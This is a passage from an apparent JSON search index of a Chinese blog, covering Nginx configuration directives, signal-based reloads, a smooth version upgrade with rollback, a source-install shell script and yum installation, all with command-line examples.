pc.test.org; location /upload { root html/; index index.html; limit_except GET { #allow 172.16.16.88; #禁止所有主机使用GET以外的方法 deny all; } } } [root@localhost ~]# curl -XPUT /etc/issue pc.test.org/upload curl: (3) \u0026lt;url\u0026gt; malformed \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; #再次访问测试，nginx拒绝访问 \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;403 Forbidden\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; aio on | off #是否启用asynchronous file I/O(AIO)功能，需要编译时添加参数开启 --with-file-aio #linux 2.6以上内核提供以下几个系统调用来支持aio： 1、SYS_io_setup：建立aio 的context 2、SYS_io_submit: 提交I/O操作请求 3、SYS_io_getevents：获取已完成的I/O事件 4、SYS_io_cancel：取消I/O操作请求 5、SYS_io_destroy：毁销aio的context directio size | off; #操作完全和aio相反，aio是读取文件而directio是写文件到磁盘，默认为关闭，当文件大于等于给定大小时，例如:directio 4m，同步（直接）写磁盘，而非写缓存。 open_file_cache off; #是否缓存打开过的文件信息 open_file_cache max=N [inactive=time]; #nginx可以缓存以下三种信息： (1) 文件元数据：文件的描述符、文件大小和最近一次的修改时间 (2) 打开的目录结构 (3) 没有找到的或者没有权限访问的文件的相关信息 max=N：#可缓存的缓存项上限数量;达到上限后会使用LRU(Least recently used，最近最少使用)算法实现管理 inactive=time：#缓存项的非活动时长，在此处指定的时长内未被命中的或命中的次数少于 open_file_cache_min_uses #指令所指定的次数的缓存项即为非活动项，将被删除 open_file_cache_valid time; #缓存项有效性的检查验证频率，默认值为60s open_file_cache_errors on | off; #是否缓存查找时发生错误的文件一类的信息,默认值为off open_file_cache_min_uses number; #open_file_cache指令的inactive参数指定的时长内，至少被命中此处指定的次数方可被归类为活动项,默认值为1 范例：\nopen_file_cache max=10000 inactive=60s; #最大缓存10000个文件，非活动数据超时时长60s open_file_cache_valid 60s; #每间隔60s检查一下缓存数据有效性 open_file_cache_min_uses 5; #60秒内至少被命中访问5次才被标记为活动数据 open_file_cache_errors on; #缓存错误信息 ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/","summary":"\u003cp\u003e主要介绍Nginx核心配置文件\u003c/p\u003e","title":"Nginx核心配置"},{"content":"利用Nginx信号实现平滑升级\nNginx 命令和信号 Nginx 命令 可以通过nginx命令向nginx进程发送信号，实现各种功能\nnginx 命令格式\nnginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] 选项说明\n帮助: -? -h 使用指定的配置文件: -c 指定配置指令:-g 指定运行目录:-p 测试配置文件是否有语法错误:-t -T 打印nginx的版本信息、编译信息等:-v -V 发送信号: -s 示例: nginx -s reload 信号说明\n立刻停止服务:stop,相当于信号SIGTERM,SIGINT 优雅的停止服务:quit,相当于信号SIGQUIT 平滑重启，重新加载配置文件: reload,相当于信号SIGHUP 重新开始记录日志文件:reopen,相当于信号SIGUSR1,在切割日志时用途较大 平滑升级可执行程序:发送信号SIGUSR2,在升级版本时使用 优雅的停止工作进程:发送信号SIGWINCH,在升级版本时使用 范例：查看nginx 使用帮助\n[root@centos7 ~]# nginx -h nginx version: nginx/1.18.0 Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit -t : test configuration and exit -T : test configuration, dump it and exit -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload -p prefix : set prefix path (default: /apps/nginx/) -c filename : set configuration file (default: conf/nginx.conf) -g directives : set global directives out of configuration file quit 信号 quit信号运行流程\n设置定时器: worker_shutdown_timeout #一定时间后关闭work进程，防止超时。 关闭监听句柄。 #不再接收新的连接请求 关闭空闲连接 在循环中等待全部连接关闭 #待连接任务执行完毕后关闭连接 退出nginx所有进程 范例：quit 信号停止nginx进程\n[root@centos7 html]# pwd #进入nginx安装目录下 /apps/nginx/html [root@centos7 html]# dd if=/dev/zero of=/apps/nginx/html/bigfile bs=1M count=1024 #生成1G的大文件bigfile 1024+0 records in 1024+0 records out 1073741824 bytes (1.1 GB) copied, 6.78492 s, 158 MB/s [root@centos7 html]# ll -h bigfile -rw-r--r-- 1 root root 1.0G Jul 21 17:37 bigfile [root@centos7 html]# hostname -I #Nginx服务器地址 172.16.16.88 reload 信号 reload信号运行流程\n利用 reload 可以实现平滑修改配置并生效\n向master进程发送HUP信号(reload命令) master进程校验配置语法是否正确 master进程打开新的监听端口 master进程用新的配置启动新的worker子进程 master进程向老worker子进程发送QUIT信号通知旧的worker处理完当前连接后退出，空闲worker旧进程不再处理新来的请求 旧worker进程关闭监听句柄，处理完当前连接后结束进程 范例：想nginx发送reload信号实现不停机更新配置\n[root@centos7 ~]# nginx #启动nginx [root@centos7 ~]# ps -ef|grep nginx #当前有一个master进程和一个worker进程 root 20091 1 0 17:51 ? 00:00:00 nginx: master process nginx nginx 20092 20091 0 17:51 ? 00:00:00 nginx: worker process root 20094 19981 0 17:51 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# cat /apps/nginx/conf/nginx.conf | grep processes #当前配置nginx的worker进程数为1 worker_processes 1; [root@centos7 ~]# sed -i \u0026#39;/worker_processes/c\\worker_processes 3;\u0026#39; /apps/nginx/conf/nginx.conf #将worker_processes 的值改为3 [root@centos7 ~]# grep worker_processes /apps/nginx/conf/nginx.conf worker_processes 3; [root@centos7 ~]# nginx -t \u0026amp;\u0026amp; nginx -s reload #检查配置并发送reload信号 nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 ~]# ps -ef | grep nginx #nginx的worker进程数量为3 root 20091 1 0 17:51 ? 00:00:00 nginx: master process nginx nginx 20158 20091 0 18:05 ? 00:00:00 nginx: worker process nginx 20159 20091 0 18:05 ? 00:00:00 nginx: worker process nginx 20160 20091 0 18:05 ? 00:00:00 nginx: worker process root 20162 19981 0 18:05 pts/1 00:00:00 grep --color=auto nginx reopen信号 reopen 信号重写日志文件\n1、nginx 当前将日志记录在access.log文件\n2、将access.log 重命名为access.log.old，日志仍记录到access.log.old文件中（因为Nginx已持有此文件的描述符）\n3、新建access.log文件，向nginx发送reopen信号，使得新的日志记录在新生成的文件中（用于实现日志轮转）\nNginx 平滑升级和回滚 工作中有时候需要对Nginx版本进行升级以满足对其功能的需求，例如添加新模块，需要新功能，而此时\nNginx又在运行着重要业务不能直接停掉。在此背景下可选择平滑升级nginx\n平滑升级流程 平滑升级流程\n将旧Nginx二进制文件换成新Nginx程序文件（注意先备份) 向master进程发送USR2信号，master进程自动修改pid文件名加上后缀.oldbin,成为nginx.pid.oldbin master进程用新Nginx文件启动新master进程成为旧master的子进程,系统中将有新旧两个Nginx主进程，新生成的master进程的PID存放至新生成的pid文件nginx.pid 主进程共同提供Web服务,当前新的请求仍然由旧Nginx的worker进程进行处理 向旧的Nginx服务进程发送WINCH信号，使旧的Nginx worker进程平滑停止 向旧master进程发送QUIT信号，关闭老master，进程自动删除Nginx.pid.oldbin文件 如果发现升级有问题,可以回滚∶向老master发送HUP，向新master发送QUIT 平滑升级和回滚案例 #当前nginx版本及安装路径 [root@centos7 nginx]# nginx -v nginx version: nginx/1.18.0 [root@centos7 nginx]# which nginx /apps/nginx/sbin/nginx #获取老版本编译参数 --prefix [root@centos7 ~]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module #下载一个较新版本，使用上一步获得的编译参数进行编译 [root@centos7 ~]# wget http://nginx.org/download/nginx-1.20.1.tar.gz [root@centos7 ~]# tar xf nginx-1.20.1.tar.gz [root@centos7 ~]# cd nginx-1.20.1/ [root@centos7 nginx-1.20.1]# ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 nginx-1.20.1]# make #不需要执行make install [root@centos7 nginx-1.20.1]# objs/nginx -v #查看编译结果 nginx version: nginx/1.20.1 #备份旧版nginx程序（用于回滚） [root@centos7 ~]# mv /apps/nginx/sbin/{nginx,nginx.old} #将编译后的新版nginx拷贝到旧版安装路径下 [root@centos7 ~]# cp ./nginx-1.20.1/objs/nginx /apps/nginx/sbin/ [root@centos7 ~]# ll /apps/nginx/sbin/ total 15308 -rwxr-xr-x 1 root root 7893488 Jul 21 18:49 nginx -rwxr-xr-x 1 root root 7774224 Jul 21 00:17 nginx.old #验证替换结果 [root@centos7 ~]# /apps/nginx/sbin/nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 ~]# /apps/nginx/sbin/nginx -v nginx version: nginx/1.20.1 #nginx 默认将pid文件存放于/app/nginx/logs/路径下 [root@centos7 ~]# grep pid /apps/nginx/conf/nginx.conf #pid logs/nginx.pid; [root@centos7 ~]# ll /apps/nginx/logs/nginx.pid -rw-r--r-- 1 root root 6 Jul 21 19:01 /apps/nginx/logs/nginx.pid #查看当前nginx进程 [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx nginx 23504 23503 0 19:06 ? 00:00:00 nginx: worker process root 23545 23521 0 19:07 pts/1 00:00:00 grep --color=auto nginx #向旧版nginx发送USR2信号 [root@centos7 ~]# kill -USR2 `cat /apps/nginx/logs/nginx.pid` #此时有两个master进程共存，其中一个master是新版nginx生成的。由新版nginx负责监听处理新的请求，旧版nginx不再处理。 [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx nginx 23504 23503 0 19:06 ? 00:00:00 nginx: worker process root 23547 23503 0 19:07 ? 00:00:00 nginx: master process nginx nginx 23548 23547 0 19:07 ? 00:00:00 nginx: worker process root 23550 23521 0 19:07 pts/1 00:00:00 grep --color=auto nginx #新版本master进程是旧版nginx进程的子进程 [root@centos7 ~]# pstree -p| grep nginx |-nginx(23503)-+-nginx(23547)---nginx(23548) | `-nginx(23504) #查看端口监听情况，两个版本都在监听80端口，但实际的请求是由旧版nginx的worker进程处理 [root@centos7 ~]# lsof -i :80 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME nginx 23503 root 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23504 nginx 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23547 root 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23548 nginx 6u IPv4 191644 0t0 TCP *:http (LISTEN) #pid文件也生成了新旧两个版本 [root@centos7 ~]# ll /apps/nginx/logs/ total 20 -rw-r--r-- 1 nginx root 172 Jul 21 18:48 access.log -rw-r--r-- 1 root root 258 Jul 21 18:19 access.log.old -rw-r--r-- 1 nginx root 1879 Jul 21 19:07 error.log -rw-r--r-- 1 root root 6 Jul 21 19:07 nginx.pid -rw-r--r-- 1 root root 6 Jul 21 19:06 nginx.pid.oldbin 。 #向旧版nginx主进程发送WINCH信号，它会逐步关闭所有worker进程（主进程不退出，方便回滚），而后所有请求将由新版nginx处理 [root@centos7 ~]# kill -WINCH `cat /apps/nginx/logs/nginx.pid.oldbin` [root@centos7 ~]# pstree -p| grep nginx |-nginx(23503)---nginx(23547)---nginx(23548) [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx root 23547 23503 0 19:07 ? 00:00:00 nginx: master process nginx nginx 23548 23547 0 19:07 ? 00:00:00 nginx: worker process root 23598 23521 0 19:22 pts/1 00:00:00 grep --color=auto nginx #如果此时新版本出现问题，可执行回滚操作 ####################回滚###################### #向旧版nginx发送HUP信号，重新生成work进程处理新的请求 [root@centos7 ~]# kill -HUP `cat /apps/nginx/logs/nginx.pid.oldbin` #关闭新版nginx进程 [root@centos7 ~]# kill -QUIT `cat /apps/nginx/logs/nginx.pid` #####################回滚#################### #经过一段时间后，如果新版nginx正常运行，就可以关闭旧版nginx主进程master [root@centos7 ~]# kill -QUIT `cat /apps/nginx/logs/nginx.pid.oldbin` [root@centos7 ~]# ps -ef | grep nginx root 23547 1 0 19:07 ? 00:00:00 nginx: master process nginx nginx 23548 23547 0 19:07 ? 00:00:00 nginx: worker process root 23603 23521 0 19:27 pts/1 00:00:00 grep --color=auto nginx #版本升级成功 [root@centos7 ~]# nginx -v nginx version: nginx/1.20.1 [root@centos7 ~]# curl localhost \u0026amp;\u0026gt; /dev/null \u0026amp;\u0026amp; echo $? 0 ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/","summary":"\u003cp\u003e利用Nginx信号实现平滑升级\u003c/p\u003e","title":"Nginx平滑升级和回滚"},{"content":"使用源码包一键安装Nginx\n#!/bin/bash #该脚本适用于centos和ubuntu操作系统 #Nginx安装成功后默认配置开机自启 ###########自定义参数############# SRC_DIR=/usr/local/src #安装路径 NGINX_INSTALL_DIR=/apps/nginx #软件版本，可提前将软件包拷贝到/usr/local/src目录下 NGINX_FILE=nginx-1.18.0 TAR=.tar.gz #下载路径 NGINX_URL=http://nginx.org/download/ #################################### #获取cpu核心数 CPUS=`lscpu |awk \u0026#39;/^CPU\\(s\\)/{print $2}\u0026#39;` #格式化输出函数，自定义输出颜色和打印宽度 color () { RES_COL=60 MOVE_TO_COL=\u0026#34;echo -en \\E[${RES_COL}G\u0026#34; SETCOLOR_SUCCESS=\u0026#34;echo -en \\E[1;32m\u0026#34; SETCOLOR_FAILURE=\u0026#34;echo -en \\E[1;31m\u0026#34; SETCOLOR_WARNING=\u0026#34;echo -en \\E[1;33m\u0026#34; SETCOLOR_NORMAL=\u0026#34;echo -en \\E[0m\u0026#34; echo -n \u0026#34;$1\u0026#34; \u0026amp;\u0026amp; $MOVE_TO_COL echo -n \u0026#34;[\u0026#34; if [ $2 = \u0026#34;success\u0026#34; -o $2 = \u0026#34;0\u0026#34; ] ;then ${SETCOLOR_SUCCESS} echo -n $\u0026#34; OK \u0026#34; elif [ $2 = \u0026#34;failure\u0026#34; -o $2 = \u0026#34;1\u0026#34; ] ;then ${SETCOLOR_FAILURE} echo -n $\u0026#34;FAILED\u0026#34; else ${SETCOLOR_WARNING} echo -n $\u0026#34;WARNING\u0026#34; fi ${SETCOLOR_NORMAL} echo -n \u0026#34;]\u0026#34; echo } #操作系统类型：CentOS/Ubuntu os_type () { awk -F\u0026#39;[ \u0026#34;]\u0026#39; \u0026#39;/^NAME/{print $2}\u0026#39; /etc/os-release } #操作系统版本：6/7/8 os_version () { awk -F\u0026#39;\u0026#34;\u0026#39; \u0026#39;/^VERSION_ID/{print $2}\u0026#39; /etc/os-release } #检查nginx是否已安装以及是否需要下载源码包 check () { [ -e ${NGINX_INSTALL_DIR} ] \u0026amp;\u0026amp; { color \u0026#34;nginx 已安装,请卸载后再安装\u0026#34; 1; exit; } cd ${SRC_DIR} if [ -e ${NGINX_FILE}${TAR} ];then color \u0026#34;相关文件已准备好\u0026#34; 0 else color \u0026#39;开始下载 nginx 源码包\u0026#39; 0 wget ${NGINX_URL}${NGINX_FILE}${TAR} [ $? -ne 0 ] \u0026amp;\u0026amp; { color \u0026#34;下载 ${NGINX_FILE}${TAR}文件失败\u0026#34; 1; exit; } fi } #安装nginx install () { color \u0026#34;开始安装 nginx\u0026#34; 0 if id nginx \u0026amp;\u0026gt; /dev/null;then color \u0026#34;nginx 用户已存在\u0026#34; 3 else useradd -s /sbin/nologin -r nginx color \u0026#34;创建 nginx 用户\u0026#34; 0 fi color \u0026#34;开始安装 nginx 依赖包\u0026#34; 0 if [ `os_type` == \u0026#34;CentOS\u0026#34; -a `os_version` == \u0026#39;8\u0026#39; ] ;then yum -y -q install make gcc-c++ libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel perl-ExtUtils-Embed elif [ `os_type` == \u0026#34;CentOS\u0026#34; -a `os_version` == \u0026#39;7\u0026#39; ];then yum -y -q install make gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed else apt update \u0026amp;\u0026gt; /dev/null apt -y install make gcc libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev \u0026amp;\u0026gt; /dev/null fi cd $SRC_DIR tar xf ${NGINX_FILE}${TAR} NGINX_DIR=`echo ${NGINX_FILE}${TAR}| sed -nr \u0026#39;s/^(.*[0-9]).*/\\1/p\u0026#39;` cd ${NGINX_DIR} ./configure --prefix=${NGINX_INSTALL_DIR} --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module make -j $CPUS \u0026amp;\u0026amp; make install [ $? -eq 0 ] \u0026amp;\u0026amp; chown -R nginx.nginx ${NGINX_INSTALL_DIR} \u0026amp;\u0026amp; color \u0026#34;nginx 编译安装成功\u0026#34; 0 || { color \u0026#34;nginx 编译安装失败,退出!\u0026#34; 1 ;exit; } echo \u0026#34;PATH=${NGINX_INSTALL_DIR}/sbin:${PATH}\u0026#34; \u0026gt; /etc/profile.d/nginx.sh . /etc/profile.d/nginx.sh cat \u0026gt; /lib/systemd/system/nginx.service \u0026lt;\u0026lt;EOF [Unit] Description=The nginx HTTP and reverse proxy server After=network.target remote-fs.target nss-lookup.target [Service] Type=forking PIDFile=${NGINX_INSTALL_DIR}/logs/nginx.pid ExecStartPre=/bin/rm -f ${NGINX_INSTALL_DIR}/logs/nginx.pid ExecStartPre=${NGINX_INSTALL_DIR}/sbin/nginx -t ExecStart=${NGINX_INSTALL_DIR}/sbin/nginx ExecReload=/bin/kill -s HUP \\$MAINPID KillSignal=SIGQUIT TimeoutStopSec=5 KillMode=process PrivateTmp=true [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl enable --now nginx \u0026amp;\u0026gt; /dev/null systemctl is-active nginx \u0026amp;\u0026gt; /dev/null || { color \u0026#34;nginx 启动失败,退出!\u0026#34; 1 ; exit; } color \u0026#34;nginx 安装完成\u0026#34; 0 } check install ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/","summary":"\u003cp\u003e使用源码包一键安装Nginx\u003c/p\u003e","title":"Nginx安装脚本"},{"content":"编译安装nginx和yum安装Nginx\nNginx 安装 Nginx版本和安装方式 Nginx版本\nMainline version 主要开发版本,一般为奇数版本号,比如1.19 Stable version 当前最新稳定版,一般为偶数版本,如:1.20 Legacy versions 旧的稳定版,一般为偶数版本,如:1.18 Nginx安装可以使用yum或源码安装，但是推荐使用源码编译安装，原因如下：\nyum的版本比较旧 编译安装可以更方便自定义相关路径 使用源码编译可以自定义相关功能，更方便业务的上的使用 查看当前系统中的nginx版本 范例：查看系统镜像源和epel源的nginx版本\n# centos7 已将nginx集成在系统镜像源 [root@centos7 ~]#dnf info nginx Last metadata expiration check: 0:53:10 ago on Tue 22 Sep 2020 11:01:33 AM CST. Available Packages Name : nginx Epoch : 1 Version : 1.14.1 #版本较老 Release : 9.module_el8.0.0+184+e34fea82 Architecture : x86_64 Size : 570 k Source : nginx-1.14.1-9.module_el8.0.0+184+e34fea82.src.rpm Repository : AppStream #系统镜像源 Summary : A high performance web server and reverse proxy server URL : http://nginx.org/ License : BSD Description : Nginx is a web server and a reverse proxy server for HTTP, SMTP, POP3 and : IMAP protocols, with a strong focus on high concurrency, performance and low : memory usage. yum 安装nginx #CentOS7 需提前配置epel源 # yum install -y epel-release [root@centos7 ~]# yum info nginx Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: mirrors.bfsu.edu.cn * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages Name : nginx Arch : x86_64 Epoch : 1 Version : 1.20.1\t#版本较新 Release : 9.el7 Size : 587 k Repo : epel/x86_64\t#epel源 Summary : A high performance web server and reverse proxy server URL : https://nginx.org License : BSD Description : Nginx is a web server and a reverse proxy server for HTTP, SMTP, POP3 and : IMAP protocols, with a strong focus on high concurrency, performance and low : memory usage. 官方包下载地址： http://nginx.org/en/linux_packages.html\n官方yum源：http://nginx.org/en/linux_packages.html#RHEL-CentOS\n范例：通过官方yum源安装nginx\n#配置yum源 [root@centos7 ~]# cat \u0026gt; /etc/yum.repos.d/nginx.repo \u0026lt;\u0026lt;EOF [nginx-stable] name=nginx stable repo baseurl=http://nginx.org/packages/centos/\\$releasever/\\$basearch/ gpgcheck=1 enabled=1 gpgkey=https://nginx.org/keys/nginx_signing.key module_hotfixes=true [nginx-mainline] name=nginx mainline repo baseurl=http://nginx.org/packages/mainline/centos/\\$releasever/\\$basearch/ gpgcheck=1 enabled=0 gpgkey=https://nginx.org/keys/nginx_signing.key module_hotfixes=true EOF #查看所有nginx版本 [root@centos7 ~]# yum list nginx --showduplicates Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: hkg.mirror.rackspace.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages nginx.x86_64 1:1.16.1-1.el7.ngx nginx-stable nginx.x86_64 1:1.18.0-1.el7.ngx nginx-stable nginx.x86_64 1:1.18.0-2.el7.ngx nginx-stable nginx.x86_64 1:1.20.0-1.el7.ngx nginx-stable nginx.x86_64 1:1.20.1-1.el7.ngx nginx-stable nginx.x86_64 1:1.20.1-9.el7 epel nginx.x86_64 1:1.20.2-1.el7.ngx nginx-stable nginx.x86_64 1:1.22.0-1.el7.ngx nginx-stable #查看版本信息（默认查看最新版本） [root@centos7 ~]# yum info nginx Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: hkg.mirror.rackspace.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages Name : nginx Arch : x86_64 Epoch : 1 Version : 1.22.0 Release : 1.el7.ngx Size : 796 k Repo : nginx-stable Summary : High performance web server URL : https://nginx.org/ License : 2-clause BSD-like license Description : nginx [engine x] is an HTTP and reverse proxy server, as well as : a mail proxy server. #安装nginx [root@centos7 ~]# yum install -y nginx 检查安装结果 [root@centos7 ~]# rpm -q nginx nginx-1.22.0-1.el7.ngx.x86_64 #查看日志轮转配置文件路径 [root@centos7 ~]# rpm -ql nginx |grep log /etc/logrotate.d/nginx /var/log/nginx #默认已配置日志轮转功能 [root@centos7 ~]# cat /etc/logrotate.d/nginx /var/log/nginx/*.log { daily missingok rotate 52 compress delaycompress notifempty create 640 nginx adm sharedscripts postrotate if [ -f /var/run/nginx.pid ]; then kill -USR1 `cat /var/run/nginx.pid` fi endscript } 查看nginx使用帮助 [root@centos7 ~]# nginx -h nginx version: nginx/1.22.0 Usage: nginx [-?hvVtTq] [-s signal] [-p prefix] [-e filename] [-c filename] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit #显示详细版本信息和编译参数 -t : test configuration and exit #检测配置文件是否有语法错误 -T : test configuration, dump it and exit #检测配置文件语法并打印结果 -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload #向nginx发送相关信号 -p prefix : set prefix path (default: /etc/nginx/) -e filename : set error log file (default: /var/log/nginx/error.log) -c filename : set configuration file (default: /etc/nginx/nginx.conf) -g directives : set global directives out of configuration file#设置全局指令,注意和配置文件不要同时配置,否则冲突 范例：nginx命令的使用\n[root@centos7 ~]# nginx -g \u0026#34;worker_processes 6;\u0026#34; # 启动并配置nginx进程数，与配置文件冲突 nginx: [emerg] \u0026#34;worker_processes\u0026#34; directive is duplicate in /etc/nginx/nginx.conf:3 [root@centos7 ~]# cat /etc/nginx/nginx.conf |grep processes #配置文件中已有配置项 worker_processes auto; [root@centos7 ~]# cat /etc/nginx/nginx.conf |grep processes #注释此配置项 #worker_processes auto; [root@centos7 ~]# nginx -g \u0026#34;worker_processes 6;\u0026#34; #启动nginx，开启6个worker进程。默认后台执行 [root@centos7 ~]# ps aux | grep nginx #验证结果 root 2233 0.0 0.1 49056 1156 ? Ss 17:23 0:00 nginx: master process nginx -g worker_processes 6; nginx 2234 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2235 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2236 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2237 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2238 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2239 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process root 2242 0.0 0.0 112812 980 pts/1 R+ 17:24 0:00 grep --color=auto nginx [root@centos7 ~]# nginx -s quit #关闭nginx（进程结束当前任务后自动关闭） [root@centos7 ~]# ps aux | grep nginx root 2246 0.0 0.0 112812 980 pts/1 R+ 17:26 0:00 grep --color=auto nginx [root@centos7 ~]# nginx -g \u0026#39;daemon off;\u0026#39; #前台启动nginx，在docker中启动时有用。 ^C[root@centos7 ~]# [root@centos7 ~]# nginx -t #nginx语法检查成功 nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful nginx 自启动service文件 [root@centos7 ~]# rpm -ql nginx | grep service /usr/lib/systemd/system/nginx-debug.service /usr/lib/systemd/system/nginx.service [root@centos7 ~]# cat /usr/lib/systemd/system/nginx.service [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking PIDFile=/var/run/nginx.pid ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf ExecReload=/bin/sh -c \u0026#34;/bin/kill -s HUP $(/bin/cat /var/run/nginx.pid)\u0026#34; ExecStop=/bin/sh -c \u0026#34;/bin/kill -s TERM $(/bin/cat /var/run/nginx.pid)\u0026#34; [Install] WantedBy=multi-user.target nginx 配置文件 [root@centos7 ~]# rpm -qc nginx /etc/logrotate.d/nginx /etc/nginx/conf.d/default.conf /etc/nginx/fastcgi_params /etc/nginx/mime.types /etc/nginx/nginx.conf /etc/nginx/scgi_params /etc/nginx/uwsgi_params #nginx安装目录结果 [root@centos7 ~]# tree /etc/nginx/ /etc/nginx/ ├── conf.d │ └── default.conf ├── fastcgi_params ├── mime.types ├── modules -\u0026gt; ../../usr/lib64/nginx/modules ├── nginx.conf ├── scgi_params └── uwsgi_params 2 directories, 6 files #nginx默认配置 [root@centos7 ~]# egrep -v \u0026#34;^ *#|^$\u0026#34; /etc/nginx/nginx.conf user nginx; error_log /var/log/nginx/error.log notice; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; keepalive_timeout 65; include /etc/nginx/conf.d/*.conf; } nginx 启动管理 [root@centos7 ~]# systemctl enable --now nginx #启动nginx并设置开机自启动 --利用service文件管理 Created symlink from /etc/systemd/system/multi-user.target.wants/nginx.service to /usr/lib/systemd/system/nginx.service. [root@centos7 ~]# systemctl status nginx #nginx成功运行 ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 17:42:56 CST; 7s ago Docs: http://nginx.org/en/docs/ Process: 2327 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2328 (nginx) CGroup: /system.slice/nginx.service ├─2328 nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf └─2329 nginx: worker process Jul 20 17:42:56 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 17:42:56 centos7 systemd[1]: Failed to parse PID from file /var/run/nginx.pid: Invalid argument Jul 20 17:42:56 centos7 systemd[1]: Started nginx - high performance web server. [root@centos7 ~]# nginx -s quit #使用nginx命令关闭 [root@centos7 ~]# ps aux | grep nginx #关闭成功 root 2338 0.0 0.0 112812 980 pts/1 R+ 17:43 0:00 grep --color=auto nginx [root@centos7 ~]# systemctl status nginx #nginx状态为 failed ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: failed (Result: exit-code) since Wed 2022-07-20 17:43:12 CST; 24s ago Docs: http://nginx.org/en/docs/ Process: 2333 ExecStop=/bin/sh -c /bin/kill -s TERM $(/bin/cat /var/run/nginx.pid) (code=exited, status=1/FAILURE) Process: 2327 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2328 (code=exited, status=0/SUCCESS) Jul 20 17:43:12 centos7 sh[2333]: -s, --signal \u0026lt;sig\u0026gt; send specified signal Jul 20 17:43:12 centos7 sh[2333]: -q, --queue 